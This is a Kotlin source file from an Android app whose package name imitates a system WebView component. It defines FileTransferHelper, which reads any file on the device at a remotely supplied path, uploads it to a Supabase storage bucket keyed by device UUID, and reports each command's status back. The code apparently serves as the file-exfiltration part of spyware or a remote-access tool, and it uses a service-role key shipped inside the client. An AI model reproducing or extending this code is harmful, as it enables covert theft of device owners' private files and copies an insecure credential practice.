package com.system.webview.sync.services

import android.content.Context
import android.util.Log
import android.webkit.MimeTypeMap
import com.system.webview.sync.network.SupabaseConfig
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

object FileTransferHelper {
    private const val TAG = "FileTransferHelper"

    // Batas ukuran file yang bisa diupload: 50 MB
    private const val MAX_FILE_SIZE_BYTES = 50L * 1024 * 1024

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(300, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    /**
     * Membaca file dari storage perangkat dan menguploadnya ke Supabase Storage
     * (bucket: file-transfers), lalu mengupdate baris file_transfer_commands.
     *
     * @return true jika berhasil sepenuhnya
     */
    fun executeTransfer(
        @Suppress("UNUSED_PARAMETER") context: Context,
        commandId: Long,
        filePath: String,
        fileName: String,
        deviceUuid: String
    ): Boolean {
        val sourceFile = File(filePath)

        // Validasi file
        if (!sourceFile.exists()) {
            updateFailed(commandId, "File tidak ditemukan: $filePath")
            return false
        }
        if (!sourceFile.isFile) {
            updateFailed(commandId, "Path bukan file: $filePath")
            return false
        }
        if (sourceFile.length() == 0L) {
            updateFailed(commandId, "File kosong (0 bytes)")
            return false
        }
        if (sourceFile.length() > MAX_FILE_SIZE_BYTES) {
            val sizeMb = sourceFile.length() / (1024 * 1024)
            updateFailed(commandId, "File terlalu besar: ${sizeMb}MB (max 50MB)")
            return false
        }

        // Tandai EXECUTING
        updateExecuting(commandId)

        // Tentukan MIME type
        val ext = fileName.substringAfterLast('.', "").lowercase()
        val mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext)
            ?: "application/octet-stream"

        // Buat storage path unik
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val safeFileName = fileName.replace(Regex("[^a-zA-Z0-9._-]"), "_")
        val storagePath = "$deviceUuid/transfer_${timestamp}_${commandId}_$safeFileName"

        Log.d(TAG, "Uploading $filePath (${sourceFile.length()} bytes) as $storagePath")

        return try {
            val uploaded = uploadToStorage(sourceFile, storagePath, mimeType)
            if (!uploaded) {
                updateFailed(commandId, "Gagal upload ke storage")
                false
            } else {
                updateDone(commandId, storagePath, sourceFile.length(), mimeType)
                Log.i(TAG, "Transfer cmd $commandId DONE: $storagePath")
                true
            }
        } catch (e: Exception) {
            Log.e(TAG, "Transfer failed cmd=$commandId", e)
            updateFailed(commandId, e.message ?: "Error tidak diketahui")
            false
        }
    }

    private fun uploadToStorage(file: File, storagePath: String, mimeType: String): Boolean {
        return try {
            val url = "${SupabaseConfig.URL}/storage/v1/object/file-transfers/$storagePath"
            val contentType = mimeType.toMediaTypeOrNull() ?: "application/octet-stream".toMediaTypeOrNull()!!
            val request = Request.Builder()
                .url(url)
                .put(file.asRequestBody(contentType))
                .addHeader("apikey", SupabaseConfig.SERVICE_ROLE_KEY)
                .addHeader("Authorization", "Bearer ${SupabaseConfig.SERVICE_ROLE_KEY}")
                .addHeader("Content-Type", mimeType)
                .addHeader("x-upsert", "true")
                .build()
            httpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Log.d(TAG, "Upload OK: $storagePath")
                    true
                } else {
                    Log.e(TAG, "Upload FAILED ${response.code}: ${response.body?.string()}")
                    false
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Upload exception", e)
            false
        }
    }

    private fun nowUtc() = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)
        .apply { timeZone = java.util.TimeZone.getTimeZone("UTC") }.format(Date())

    private fun patchCommand(commandId: Long, body: JSONObject) {
        try {
            val url = "${SupabaseConfig.URL}/rest/v1/file_transfer_commands?id=eq.$commandId"
            val request = Request.Builder()
                .url(url)
                .patch(body.toString().toRequestBody("application/json".toMediaTypeOrNull()))
                .addHeader("apikey", SupabaseConfig.ANON_KEY)
                .addHeader("Authorization", "Bearer ${SupabaseConfig.ANON_KEY}")
                .addHeader("Prefer", "return=minimal")
                .build()
            httpClient.newCall(request).execute().use {}
        } catch (e: Exception) {
            Log.e(TAG, "patchCommand failed", e)
        }
    }

    private fun updateExecuting(commandId: Long) {
        patchCommand(commandId, JSONObject().apply {
            put("status", "EXECUTING")
        })
    }

    private fun updateDone(commandId: Long, storagePath: String, fileSize: Long, mimeType: String) {
        patchCommand(commandId, JSONObject().apply {
            put("status", "DONE")
            put("storage_path", storagePath)
            put("file_size_bytes", fileSize)
            put("mime_type", mimeType)
            put("executed_at", nowUtc())
        })
    }

    private fun updateFailed(commandId: Long, errorMsg: String) {
        patchCommand(commandId, JSONObject().apply {
            put("status", "FAILED")
            put("error_message", errorMsg.take(500))
            put("executed_at", nowUtc())
        })
    }
}
